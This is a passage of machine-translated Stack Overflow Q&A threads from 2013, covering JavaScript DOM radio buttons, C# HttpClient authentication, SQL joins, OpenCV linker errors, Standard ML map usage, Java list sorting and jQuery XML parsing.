代码的主要问题（您在评论中发布，我复制到问题中）是它只包含一个函数定义。该函数根本没有被调用，所以需要有一个像`test()`. 此外，该函数假定`id=divTxt`页面上有一个元素，并且该元素必须出现在调用该函数之前。以下代码成功创建了一个单选按钮元素及其标签，并将它们插入到页面上的现有元素中：

```
<!DOCTYPE html>
<title>Demo</title>
<div id=divTxt></div>
<script>
function test() {
var element = document.createElement("input");
//Assign different attributes to the element.
element.setAttribute('type', 'radio');
element.setAttribute('value', 'source');
element.setAttribute('name', 'source'); 
element.setAttribute('id', 'source_id');
var foo = document.getElementById("divTxt");
foo.appendChild(element);
var newlabel2 = document.createElement("Label"); 
newlabel2.setAttribute('for', "source_id");
newlabel2.innerHTML = "first name ";
foo.appendChild(newlabel2);
}
test();
</script> 
```

（您不能`for`在 JavaScript 中使用该属性；属性名称为`htmlFor`，但按上述设置`for` *属性*可能更简单。）

但是，由于单选按钮的性质，单选按钮应始终以组的形式出现，因此您应该使用带有一些参数的函数根据通用模式生成一组单选按钮。像这样：

```
<!DOCTYPE html>
<title>Demo</title>
<div id=divTxt></div>
<script>
function radio(name, value, text) {
var element = document.createElement("input");
var id = name + value;
element.setAttribute('type', 'radio');
element.setAttribute('value', value);
element.setAttribute('name', name); 
element.setAttribute('id', id);
var foo = document.getElementById("divTxt");
foo.appendChild(element);
var newlabel2 = document.createElement("label"); 
newlabel2.setAttribute('for', id);
newlabel2.innerHTML = text;
foo.appendChild(newlabel2);
}
radio('sex', '0', 'male');
radio('sex', '1', 'female');
</script> 
```

您应该通过添加在项目之间添加换行符的代码来最小程度地增强这一点，或者最好将每对按钮及其标签放在`div`elemebt 中。

# c# - Reading JSON from URL and passing username and password

> ID：16184622
> 
> 赞同：0
> 
> 时间：2013-04-24T06:13:21.697
> 
> 标签：c#, json, httpclient, winrt-xaml

I am using WinRT framework. I have to get JSON response from service URL by passing username and password.

Here is the code I have tried

```
var credentials = new NetworkCredential("***", "***");
        var handler = new HttpClientHandler { Credentials = credentials };
        //client.DefaultRequestHeaders.Add("UserID", "****");
        //client.DefaultRequestHeaders.Add("Password", "****");
        HttpClient client = new HttpClient(handler); 
```

But this throw error

Response status code does not indicate success: 500 (Internal Server Error).

Any help is appreciated.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:26:24.387

你唯一想念的是`User-Agent`。这有效....

```
var credentials = new NetworkCredential("****", "*****");
var handler = new HttpClientHandler { Credentials = credentials, AllowAutoRedirect = true };

HttpClient client = new HttpClient(handler);
client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12"); 
var responseString = await client.GetStringAsync("https://mobility.gap.com/MobileAppProvider/resources/gapresources/v1/buildings"); 
```

# vbscript - Windows 应用程序的 QTP 安装程序代码

> ID：16184624
> 
> 赞同：0
> 
> 时间：2013-04-24T06:13:29.083
> 
> 标签：vbscript, qtp, windows-applications

我正在研究 QTP 自动化系统。我需要编写自定义代码以便为我的应用程序选择一个安装程序并运行它。任何人都可以帮助我指导我应该编写的代码片段：

1.  代码应该能够从文件夹路径位置选择安装程序并运行最新的 Build Exe 安装程序。exe 文件保存在按日期排序的文件夹路径中。
2.  此外，代码应该能够将安装程序移动到单击下一步-> 下一个选择，并最终在整个安装过程中完成。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T09:06:21.057

对于第一部分，您可以使用它`filesystemobject`来查找文件夹中的所有文件，您可以使用执行最新文件`SystemUtil.Run "path to the latest file"`

检查链接[http://www.qtpworld.com/index.php?cid=41](http://www.qtpworld.com/index.php?cid=41)以获取有关如何使用文件系统对象的更多详细信息。

对于第二部分，您必须从 QTP 运行安装程序并记录您需要在安装程序上执行的所有操作。仅当所有安装程序都具有相同的用户界面或相同的一组按钮时，这才有效。

# quicksort - 使用随机枢轴的快速排序实现

> ID：16184625
> 
> 赞同：1
> 
> 时间：2013-04-24T06:13:30.730
> 
> 标签：quicksort

是否有任何广泛使用的使用随机选择的枢轴的快速排序实现？

我问，因为[库`C`函数是`qsort`使用](http://www.opensource.apple.com/source/xnu/xnu-1456.1.26/bsd/kern/qsort.c)“ [Tukey's 'ninther'，三个样本的中位数的中位数，每个三个元素的中位数”实现的，](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.14.8162&rep=rep1&type=pdf)并且性能明显优于随机快速排序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-03T11:16:47.787

理论上，随机枢轴快速排序的预期时间确实是`O(nlogn)`。

但我认为，如果存在随机枢轴选择的实现，那将是很少见的，因为它不实用。原因：

*   真正随机性的成本在执行时间上很高。
*   使用伪随机性意味着可以构造一个输入来驱动排序`O(n^2)`

看看这个黑客新闻线程：[https ://news.ycombinator.com/item?id=1442849](https://news.ycombinator.com/item?id=1442849)

如果此信息不正确，请告诉我，以便我更新此答案。

# sql-server - 如何在插件的 GetDisplayWidgetRoute() 方法中获取模型？

> ID：16184631
> 
> 赞同：0
> 
> 时间：2013-04-24T06:13:56.607
> 
> 标签：sql-server, asp.net-mvc-4, nopcommerce

我正在为 NopCommerce 2.80 中的类别页面开发小部件。我在其中使用小部件区域来显示规格过滤器、制造商和价格过滤器。

我的问题是，每当我的小部件区域被调用时，我都需要 CategoryModel。但在这种情况下，我目前无法拥有 CategoryModel。它仅在我运行类别操作方法时可用。

那么当我的小部件区域被调用时，我怎样才能得到我的类别模型。即使我可以通过获取类别 ID 然后从数据库中检索所有数据来做到这一点。但我不想调用数据库来获取这个模型值。它将产生性能问题。

我怎样才能做到这一点？请帮我..

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T21:45:33.940

我认为您尝试做的事情是不可能的，但我可能是错的。

但是，如果您再次检索 categoryModel，则无需担心性能问题，因为它正在被缓存。不会再次调用数据库。

# database - 如何在sql server查询中加入两个以上的表

> ID：16184639
> 
> 赞同：0
> 
> 时间：2013-04-24T06:14:14.107
> 
> 标签：database, sql-server-2008, left-join, inner-join

我正在 SQL Server 2008 中创建一个存储过程，以从第一个表中查找学生数据、从第二个表中查找健康详细信息以及从第三个表中查找出勤详细信息。我想使用左外连接或内连接来连接这些表。

SQL查询如下：

```
create proc [dbo].[GetStdProfile]
@Adm_No int
AS
BEGIN   
    SELECT sd.*,hd.*,ad.* 
    FROM Student_Details sd left outer join Health_Details hd left outer join Attendance_Details ad 
    on sd.Adm_No=hd.Adm_No  and sd.Adm_No = ad.Adm_No and hd.Adm_No=ad.Adm_No
END 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:21:26.270

像这样更改您的查询：

```
create proc [dbo].[GetStdProfile]
    @Adm_No int  
BEGIN   
    SELECT sd.*,hd.*,ad.* 
    FROM Student_Details sd 
       left outer join Health_Details hd on sd.Adm_No = hd.Adm_No
       left outer join Attendance_Details ad on hd.Adm_No = ad.Adm_No
END 
```

注意：您没有使用参数`@Adm_No`。如果不需要，请将其删除。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:22:22.877

如果您要选择 *，则无需为它们添加前缀。我不知道您是否在运行程序时遇到问题，但是先连接然后再连接有点麻烦。当您连接共享相同字段和 id 的表时，无需将单个表连接到多个表。您将 hd.Adm_No 加入 sd.Adm_No 和 ad.Adm_no。通过执行以下操作可以轻松过滤掉这种关系：

```
create proc [dbo].[GetStdProfile] 
@Adm_No int 
AS 
BEGIN
  SELECT * FROM Student_Details sd left outer join Health_Details hd on 
        sd.Adm_No=hd.Adm_No left outer join Attendance_Details ad  
        on hd.Adm_No = ad.Adm_No 
    Where sd.Adm_No = @Adm_No;
END 
```

# c++ - OpenCV 2.4 - 致命错误 LNK1104

> ID：16184641
> 
> 赞同：0
> 
> 时间：2013-04-24T06:14:23.213
> 
> 标签：c++, visual-studio-2010, visual-c++, opencv

这是我第一次使用 Visual Studio Professional 2010 进行 GUI 尝试，是的，它涉及 OpenCV。请看下面的代码

***GUI 代码非常简单，仅包含 1 个按钮。***

**表格1.h**

```
#pragma once
#include "ImageOpen.h"

namespace GUI {

    using namespace System;
    using namespace System::ComponentModel;
    using namespace System::Collections;
    using namespace System::Windows::Forms;
    using namespace System::Data;
    using namespace System::Drawing;

    /// <summary>
    /// Summary for Form1
    /// </summary>
    public ref class Form1 : public System::Windows::Forms::Form
    {
    public:
        Form1(void)
        {
            InitializeComponent();
            //
            //TODO: Add the constructor code here
            //
        }

    protected:
        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        ~Form1()
        {
            if (components)
            {
                delete components;
            }
        }
    private: System::Windows::Forms::Button^  button1;
    protected: 

    private:
        /// <summary>
        /// Required designer variable.
        /// </summary>
        System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        void InitializeComponent(void)
        {
            this->button1 = (gcnew System::Windows::Forms::Button());
            this->SuspendLayout();
            // 
            // button1
            // 
            this->button1->Location = System::Drawing::Point(27, 49);
            this->button1->Name = L"button1";
            this->button1->Size = System::Drawing::Size(75, 23);
            this->button1->TabIndex = 0;
            this->button1->Text = L"button1";
            this->button1->UseVisualStyleBackColor = true;
            this->button1->Click += gcnew System::EventHandler(this, &Form1::button1_Click);
            // 
            // Form1
            // 
            this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
            this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
            this->ClientSize = System::Drawing::Size(284, 262);
            this->Controls->Add(this->button1);
            this->Name = L"Form1";
            this->Text = L"Form1";
            this->ResumeLayout(false);

        }
#pragma endregion
    private: System::Void button1_Click(System::Object^  sender, System::EventArgs^  e) {
                 ImageOpen i;
                 i.OpenImage();

             }
    };
} 
```

**Form1.cpp**

// GUI.cpp : 主项目文件。

```
#include "stdafx.h"
#include "Form1.h"

using namespace GUI;

[STAThreadAttribute]
int main(array<System::String ^> ^args)
{
    // Enabling Windows XP visual effects before any controls are created
    Application::EnableVisualStyles();
    Application::SetCompatibleTextRenderingDefault(false); 

    // Create the main window and run it
    Application::Run(gcnew Form1());
    return 0;
} 
```

**图像打开.h**

```
#pragma once
#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <iostream>

using namespace std;
using namespace cv;

 class ImageOpen
{
public:
    ImageOpen(void);
    void OpenImage();
}; 
```

**图像打开.cpp**

```
#include "StdAfx.h"
#include "ImageOpen.h"

ImageOpen::ImageOpen(void)
{
}

void ImageOpen::OpenImage()
{
    Mat image = imread("C:/Users/Public/Pictures/Sample Pictures/Tulips.jpg");

    namedWindow("Image");
    imshow("Image",image);

    waitKey(0);
} 
```

GUI 很简单，如下所示，所以我认为您甚至不必看 GUI 代码

![在此处输入图像描述](https://i.stack.imgur.com/N4yKB.png)

不幸的是，当我运行它时，我收到以下错误

```
1>------ Build started: Project: GUI, Configuration: Debug Win32 ------
1>  stdafx.cpp
1>  AssemblyInfo.cpp
1>  GUI.cpp
1>  ImageOpen.cpp
1>  Generating Code...
1>LINK : fatal error LNK1104: cannot open file 'tbb_debug.lib'
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ========== 
```

这也发生在 VS 2010 Express 中。为什么我收到此错误？我在 opencv 中找不到 tbb_debug.lib 文件。我的opencv版本是2.4。请帮忙！

**更新**

此链接 [OpenCV and VS2010: Fatal error LNK1104: atal error LNK1104: cannot open file 'tbb_debug.lib](https://stackoverflow.com/questions/12609157/opencv-and-vs2010-fatal-error-lnk1104-atal-error-lnk1104-cannot-open-file-tb)建议我们需要将*公共语言运行时支持*更改为*无公共语言运行时支持*。

然后我得到这个错误

```
1>------ Build started: Project: GUI, Configuration: Debug Win32 ------
1>  stdafx.cpp
1>  ImageOpen.cpp
1>  GUI.cpp
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(6): error C2871: 'System' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(7): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(7): error C2871: 'ComponentModel' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(8): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(8): error C2871: 'Collections' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(9): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(9): error C2871: 'Forms' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(10): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(10): error C2871: 'Data' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(11): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(11): error C2871: 'Drawing' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(16): error C2059: syntax error : 'public'
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(16): error C2059: syntax error : 'public'
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(16): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(17): error C2143: syntax error : missing ';' before '{'
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\form1.h(17): error C2447: '{' : missing function header (old-style formal list?)
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\gui.cpp(8): error C2337: 'STAThreadAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\gui.cpp(9): error C2065: 'array' : undeclared identifier
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\gui.cpp(9): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\gui.cpp(9): error C2275: 'cv::String' : illegal use of this type as an expression
1>          c:\opencv\build\include\opencv2\core\core.hpp(87) : see declaration of 'cv::String'
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\gui.cpp(9): error C2059: syntax error : '>'
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\gui.cpp(10): error C2143: syntax error : missing ';' before '{'
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\gui.cpp(10): error C2447: '{' : missing function header (old-style formal list?)
1>  AssemblyInfo.cpp
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(3): error C2871: 'System' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(4): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(4): error C2871: 'Reflection' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(5): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(5): error C2871: 'CompilerServices' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(6): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(6): error C2871: 'InteropServices' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(7): error C2653: 'System' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(7): error C2871: 'Permissions' : a namespace with this name does not exist
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(14): error C2337: 'AssemblyTitleAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(15): error C2337: 'AssemblyDescriptionAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(16): error C2337: 'AssemblyConfigurationAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(17): error C2337: 'AssemblyCompanyAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(18): error C2337: 'AssemblyProductAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(19): error C2337: 'AssemblyCopyrightAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(20): error C2337: 'AssemblyTrademarkAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(21): error C2337: 'AssemblyCultureAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(34): error C2337: 'AssemblyVersionAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(36): error C2337: 'ComVisible' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(38): error C2337: 'CLSCompliantAttribute' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(40): error C2337: 'SecurityPermission' : attribute not found
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(40): error C2653: 'SecurityAction' : is not a class or namespace name
1>c:\users\yohan\documents\visual studio 2010\projects\gui\gui\assemblyinfo.cpp(40): error C2065: 'RequestMinimum' : undeclared identifier
1>          missing quotes ("") around 'RequestMinimum'?
1>  Generating Code...
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ========== 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:29:47.067

如链接中所建议：[OpenCV and VS2010: Fatal error LNK1104: atal error LNK1104: cannot open file 'tbb_debug.lib](https://stackoverflow.com/questions/12609157/opencv-and-vs2010-fatal-error-lnk1104-atal-error-lnk1104-cannot-open-file-tb)

您可以在配置属性->常规->公共语言运行时中将公共语言运行时支持 (/clr) 更改为无公共语言运行时支持。

您还没有包含相关的 windows 窗体头文件`Form1.h`

# string - 在标准 ML 中使用地图时，我究竟是如何破坏这种尝试的？

> ID：16184644
> 
> 赞同：1
> 
> 时间：2013-04-24T06:14:39.033
> 
> 标签：string, list, map, smlnj

我正在Standrd ML 中为课堂作业编写凯撒密码。我对函数式编程非常熟悉，知道地图可能是我想要的。我无法理解在标准 ML 中实现地图功能的方式。

```
fun chrEnc (letter:char, key:int): char = 
    if Char.isAlpha(letter) then 
        if Char.isUpper(letter) then 
            chr (ord #"A" + (ord letter - ord #"A" - key) mod 26)
        else  chr (ord #"a" + (ord letter - ord #"z" - key) mod 26)
    else letter;

fun chrDec(letter:char, key:int): char  =
    chrEnc(letter,  (~1 * key));

fun msgEnc(message:string, key:int): string  =
    implode (map (fn x => chrEnc(x,key)) (explode message)); 
```

您可能会猜到 msgEnc 的预期行为是获取消息和键，并遍历消息，执行 chrEnc(x key) 其中 x 是字符串消息中的当前值并返回映射的字符串。msgEnc("IBM",1); 的预期输出 应该是“HAL”。但是，它是“HBM”，这使它看起来好像只对第一个字符进行操作。我想也许使用 (explode message) 作为 map 的列表参数可能是问题，所以我尝试了：

```
fun msgEnc(message:string, key:int): string  =
 val msg = explode message;
 implode (map (fn x => chrEnc(x,key)) msg); 
```

但是 val 上的 REPL barfs 说：

= = = = = [自动加载]
[库 $SMLNJ-BASIS/basis.cm 稳定]
[自动加载完成]
val chrEnc = fn : char * int -> char
- - = val chrDec = fn : char * int -> char
- - = stdIn:27.2 错误：在 VAL 处发现语法错误

不知道我错过了什么，我的假设是我误解了 map 的语法或用法。昨天之前我从未见过 ML，所以我是个傻子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T16:21:21.403

首先，您的原始代码实际上似乎对我有用，所以也许可以尝试在新的 REPL 中重新编译或运行您的代码：

```
- msgEnc("IBM", 1);
val it = "HAL" : string 
```

您的第二段代码的问题只是语法错误。你不能`val`在这样的函数范围内有简单的绑定，只能在顶层。对于函数的局部变量，请使用`let`：

```
fun msgEnc (message:string, key:int) : string =
    let
       val msg = explode message
    in
       implode (map (fn x => chrEnc(x, key)) msg)
    end 
```

这实际上完全等同于您的原始代码，因为唯一的区别是本地`msg`绑定。

标准 ML 非常面向表达式：函数体必须是单个表达式。您有两个语句，但`val`绑定不是语句。您可以使用分号和括号对表达式进行排序，但这仅对具有副作用的代码非常有用，例如：

```
let
    val name = "nick"
in
    (print "hi "; print name)
end 
```

整个事情也是一个表达式，其中表达式的值是序列`let`中的最后一个表达式。`(...; ...; ...)`事实上，代码中的分号实际上都不是必需的。

希望有帮助！

# java - 排序ArrayList的ArrayList 在java中

> ID：16184653
> 
> 赞同：5
> 
> 时间：2013-04-24T06:15:06.717
> 
> 标签：java, sorting, arraylist, comparator, comparable

我有一个字符串的 ArrayList 的 ArrayList。

在 Outer ArrayList 中，每个索引上的每个 Inner ArrayList 都有四个项目和四个参数。

1.  联系人 ID
2.  联系人姓名
3.  联系人地址
4.  联络号码

现在我想根据联系人姓名参数对完整的 ArrayList 进行排序。

意味着我要访问外部 Arraylist，外部 Arraylist 的每个索引上存在的内部 ArrayList 应根据联系人姓名进行排序。

比较器/可比较接口不太可能帮助我。

Collection.sort 帮不了我

[对 Bean 的 Arraylist 的 Arraylist 进行排序](https://stackoverflow.com/questions/13154108/sorting-arraylist-of-arraylist-of-bean)。我已经阅读了这篇文章，但它是`ArrayList`针对`ArrayList<Object>`. 如何解决这个问题？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-24T06:27:59.340

假设您的列表中的列表具有顺序 id、名称、地址和编号的字符串（即名称位于索引 1），您可以使用 a `Comparator`，如下所示：

```
List<List<String>> list;
Collections.sort(list, new Comparator<List<String>> () {
    @Override
    public int compare(List<String> a, List<String> b) {
        return a.get(1).compareTo(b.get(1));
    }
}); 
```

顺便说一句，您使用的是不是很重要`ArrayList`：使用抽象类型声明变量是一种很好的编程习惯，即`List`（正如我在这段代码中所做的那样）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-24T06:23:40.357

我感觉很糟糕发布这个，因为这`List<Contact>`将是**更好**的选择。不过，这样的事情是可能的：

```
ArrayList<ArrayList<String>> yourList = ...
Collections.sort(yourList, new Comparator<ArrayList<String>>() {
    @Override
    public int compare(ArrayList<String> one, ArrayList<String> two) {
        return one.get(1).compareTo(two.get(1));
    }
}); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-25T12:20:29.597

```
 import java.util.Collections;
  import java.util.Comparator;
  import java.util.List;

  public class ListsUtils {

      public static void sortListOfLists(List < List < String >> listOfLists) {

          // first sort the inner arrays using collections.sort
          for (List < String > innerList: listOfLists) {
              Collections.sort(innerList);
          }

          // now sort by comparing the first string of each inner list using a comparator
          Collections.sort(listOfLists, new ListOfStringsComparator());
      }

      static final class ListOfStringsComparator implements Comparator < List < String >> {

          @
          Override
          public int compare(List < String > o1, List < String > o2) {
              // do other error checks here as well... such as null. outofbounds, etc
              return o1.get(0).compareTo(o2.get(0));
          }

      }
  } 
```

我想我只是假设您必须对字符串数组列表进行排序......这就是为什么我首先对内部数组列表进行排序，然后通过比较每个数组的第一项来对外部列表进行排序。没有阅读您在答案中的联系人。

在这种情况下，删除用于对内部列表进行排序的 for 循环，您仍然应该能够使用比较器进行排序，但与正确的索引而不是第一个元素进行比较。

Collections.sort(listOfLists, new ListOfStringListComparator());

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-24T06:20:04.953

> Comparator / Comparable Interfaces 无济于事，因为我没有任何对象。

不正确。你确实有对象。您尝试排序的所有事物都是对象。

如果您尝试对 a 中的`ArrayList<String>`对象进行排序`ArrayList<ArrayList<String>>`，则需要实现 a `Comparator<ArrayList<String>>`。（这种数据结构的 Comparable 方法是错误的。您需要声明 ArrayList 的自定义子类......这太糟糕了！）

* * *

但更好的主意是用自定义类来表示您的对象。在这种情况下，您`ArrayList of String`应该是一个`Contact`具有 4 个字段、getter 和（如果需要）setter 的自定义类。然后您将其声明为 implementation `Comparable<Contact>`，并实现该`compareTo`方法。

* * *

其他答案显示了如何仅基于列表的一个字段来实现比较器。这可能就足够了，但它会给你一个排序顺序，其中一对不同的“John Smith”的顺序是不确定的。（我会使用第二个字段作为决胜局。如果 id 是唯一的，则 Id 字段将是理想的。）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-24T06:21:04.130

您应该为您的数据结构创建一个类（如果不能，请说明原因。我看不出有什么好的理由不这样做）：

```
public class Contact implements Comparable {
    private String id;
    private String name;
    private String address;
    private String number;

    // Getters and setters, and compareTo.
} 
```

然后在您的列表中使用它：

```
List<Contact> contacts = new ArrayList<Contacts>(); 
```

然后对其进行排序将是微不足道的。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-24T06:26:47.263

使用以下比较器：

```
class MyComparator implements Comparator<ArrayList<String>> {
    private static int indexToCompare = 1;
    @Override
    public int compare(ArrayList<String> o1, ArrayList<String> o2) {
        return o1.get(indexToCompare).compareTo(o2.get(indexToCompare));
    }

} 
```

这`indexToCompare`是对应于联系人姓名的数组列表的索引。在你的情况下“1”

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-24T06:20:45.590

我认为这是不将集合视为一流对象的情况。有一个名为“Contact”的新类，而不是将其抽象为 ArrayList，并使用 Comparator。

# jquery - 如何在列表视图中获取父标签以及单击特定父标签时如何获取其子标签

> ID：16184655
> 
> 赞同：0
> 
> 时间：2013-04-24T06:15:17.443
> 
> 标签：jquery, html, xml

我对 jquery 很陌生。任何人都可以帮助我在列表视图中获取父级，当我们单击特定父级时，我们必须获取相应的子级。

我的 XML 文件：

```
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <page count="56" name="ebook">
    <sections>
    <section count="7" name="Seduce Your Partner" order="1">
      <content file="93828.txt" order="1">Balmy with rich perfumes</content>
      <content file="93829.txt" order="2">Wear a fine dress</content>
      <content file="93830.txt" order="3">Welcome to Love Abode</content>
      <content file="93831.txt" order="4">Rekindle your love</content>
      <content file="93832.txt" order="5">Flower a love messanger</content>
      <content file="93833.txt" order="6">Perfumes and Aromas</content>
      <content file="93834.txt" order="7">Gain a women&amp;apos;s heart</content>
    </section>
    <section count="6" name="The Touch of Love" order="2">
      <content file="93835.txt" order="8">A Love Message</content>
      <content file="93836.txt" order="9">An awakening kiss</content>
      <content file="93837.txt" order="10">Heading South with Confidence</content>
      <content file="93838.txt" order="11">Caressing</content>
      <content file="93839.txt" order="12">Stroking</content>
      <content file="93840.txt" order="13">Blows &amp;amp; Cries</content>
    </section>
    <section count="8" name="Beyond Touch" order="3">
      <content file="93841.txt" order="14">Watch, Listen &amp;amp; Experiment</content>
      <content file="93842.txt" order="15">Blindfolded</content>
      <content file="93843.txt" order="16">Embrace of Jaghana</content>
      <content file="93844.txt" order="17">Piercing Embrace</content>
      <content file="93845.txt" order="18">Twining of a Creeper</content>
      <content file="93846.txt" order="19">Line of Jewels</content>
      <content file="93847.txt" order="20">Token of Remembrance</content>
      <content file="93848.txt" order="21">Oils and Lotions</content>
    </section>
  </sections>
</page> 
```

我的 HTML 文件：

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>XML File</title> 
    <meta name="viewport" content="width=device-width, initial-scale=1"> 

    <link href="http://code.jquery.com/mobile/1.1.0/jquery.mobile-1.1.0.min.css" rel="stylesheet"/>
    <script src="http://code.jquery.com/jquery-1.7.1.min.js" type='text/javascript'></script>
    <script src="http://code.jquery.com/mobile/1.1.0/jquery.mobile-1.1.0.min.js" type='text/javascript'></script>

    <script src="script1.js" type='text/javascript'></script>
</head>
<body>
<!-- Home Page -->
    <div data-role="page" id="home">
        <div data-role="header" data-theme="a">
            <h1>Mobile Viewer</h1>
        </div>
        <div data-role="content">
            <ul id="section_list" data-role="listview">
            <!-- <ul id="content_list" data-role="listview">
            </ul> -->
            </ul>
        </div>

        <div data-role="footer" data-theme="a">
            <h1>Footer</h1>
        </div>
    </div>

<!-- Chapter Page -->
    <div data-role="page" id="chapter">
        <div data-role="header" data-position="fixed" data-theme="a">
            <a href="#home" data-role="button" data-icon="home" data-iconpos="notext">Home</a>
            <h1></h1>
            <a href="" data-role="button" class="next" data-icon="forward" data-iconpos="notext">Next</a>
        </div>

        <div data-role="content">
            <ul id="content_list" data-role="listview">
            </ul>
        </div>

        <div data-role="footer" data-theme="a">
        </div>
    </div>

</div>
</body>
</html> 
```

我想要输出像：

所有父母都在使用属性名称的列表视图中，例如：

用爱之触引诱您的伴侣。. .

所以当我点击“勾引你的伴侣”时，我想让孩子们在这个标签下的列表视图中。

提前致谢..

谢谢你它工作正常，但你可以用我的 html 页面检查这个：

```
$(document).ready(function()

{
  $.ajax({
    type: "GET",
    url: "449.xml",
    dataType: "xml",
    success: function parseXml(xml)
    {

    $(xml).find('section[name]').each(function() {

             var section = $(this).attr("name");

        $("#section_list").append('<li><a href='+ "#chapter" + ' id="">' + section + '  </a> </li>');

        $("#section_list").listview('refresh');

    });

    $(xml).children().each(function() {

    var content = $(this).text();   

    $("#content_list").append('<li><a href='+ "#" + 'id="" ">' + content + ' </a> </li> ');

    $("#content_list").listview('refresh');

    });
}
 });
}); 
```

